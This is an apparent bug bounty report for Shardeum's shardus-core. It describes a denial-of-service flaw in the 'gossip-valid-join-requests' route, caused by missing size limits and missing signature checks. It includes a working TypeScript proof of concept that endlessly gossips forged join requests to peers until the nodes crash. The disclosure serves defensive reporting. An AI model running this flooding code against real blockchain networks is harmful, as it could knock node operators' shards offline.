# 33395 - \[BC - Insight] DoS attack on peer nodes through gossip-valid-j...

Submitted on Jul 19th 2024 at 17:59:29 UTC by @GuplerSaxanoid for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33395

Report type: Blockchain/DLT

Report severity: Insight

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours
* Shutdown of greater than or equal to 30% of network processing nodes without brute force actions, but does not shut down the network

## Description

## Brief/Intro

A malicious node is able to perform DoS attack on peers through `gossip-valid-join-requests` gossip route due to lack of checks on resource consumption, lack of signature verification and insufficient duplication checks

## Vulnerability Details

The vulnerability arises from a series of flaws left behind in `gossip-valid-join-requests`:

1. There is no limit to size of newJoinRequests list
2. There is no signature verification happening anywhere along the execution path leading to addition of JoinRequest to newJoinRequests list
3. Duplication checks happen against publickey instead of ip/port pairs. This is redundant since publickey can be any random string (due to absence of signature verification)

These vulnerabilities aid a malicious node to iteratively flood the subject with `gossip-valid-join-requests` for the first two quarters of a cycle and exhaust the target node's memory. If the target node manages to go past the memory exhaustion phase, a fatal error will occur when it tries to convert the given public key to a curve public key.

## Impact Details

The malicious node is able to bring down it's peer nodes either by memory exhaustion or by a fatal error in trying to convert the given publickey string to a curve public key. Given that the malicious node is able to gossip to all the nodes in a shard, it will bring down an entire shard with this exploit.

The Impact of this DoS attack from a single node is constricted to the shard that it belongs to. Given the uniform distribution nature of the random function that assigns shards to nodes joining the network, an adversary controlling 3 or more nodes can expand their impact to 3 or more shards, which is approximately 30% of a network comprising 10-11 shards.

Expanding the impact to the entire network is a matter of probability since there is no known method for the adversary to manipulate the random function to place their nodes in every single shard. Deriving further from that fact, causing a total network shutdown is a matter of probability and therefore this is not a critical vulnerability (although it could might well turn out to be one).

## References

Beginning of `gossip-valid-join-requests` gossip handler: <https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/p2p/Join/routes.ts#L427>

## Proof of Concept

1. Register the following external route to enact a malicious node: (NOTE: "allowUnreachableCode" option needs to be enabled in tsconfig.json as this code contains an infinite loop)

```ts
import { JoinRequest } from '@shardus/types/build/src/p2p/JoinTypes'
import * as Comms from '@shardus/core/dist/p2p/Comms';
import { nodeListFromStates } from "@shardus/core/dist/p2p/Join";
import * as Self from "@shardus/core/dist/p2p/Self";
import * as CycleChain from "@shardus/core/dist/p2p/CycleChain";

shardus.registerExternalPost('gossip-join-dos-attack', externalApiMiddleware, async (req, res) => {
        var i = 0;
        while(true) {
            const obj: JoinRequest = {
                nodeInfo: {
                    publicKey: "pk"+i,
                    externalIp: "127.0.0.1",
                    externalPort: 80,
                    internalIp: "",
                    internalPort: 0,
                    address: "",
                    joinRequestTimestamp: CycleChain.newest.start,
                    activeTimestamp: CycleChain.newest.start,
                    syncingTimestamp: CycleChain.newest.start,
                    readyTimestamp: CycleChain.newest.start,
                },
                selectionNum: "1",
                proofOfWork: "",
                cycleMarker: "",
                version: "",
                sign: {
                    owner: "pk"+i,
                    sig: ""
                },
                appJoinData:{
                  version: AccountsStorage.cachedNetworkAccount.current.minVersion,
                  stakeCert: "",
                  adminCert: "",
                  mustUseAdminCert: false
                }
            }
    
            await Comms.sendGossip(
                "gossip-valid-join-requests",
                obj,
                "",
                Self.id as any,
                nodeListFromStates([
                    P2P.P2PTypes.NodeStatus.ACTIVE,
                    P2P.P2PTypes.NodeStatus.READY,
                    P2P.P2PTypes.NodeStatus.SYNCING,
                  ]),
                false
            )

            i++;
        }

    return res.json("");
  })
```

2. Spin up a local network, and wait for the nodes to go active
3. Make a POST call to `gossip-join-dos-attack` endpoint
4. Wait for a while and observe the nodes go offline

There are three exit logs provided in the github gist link for evidence.
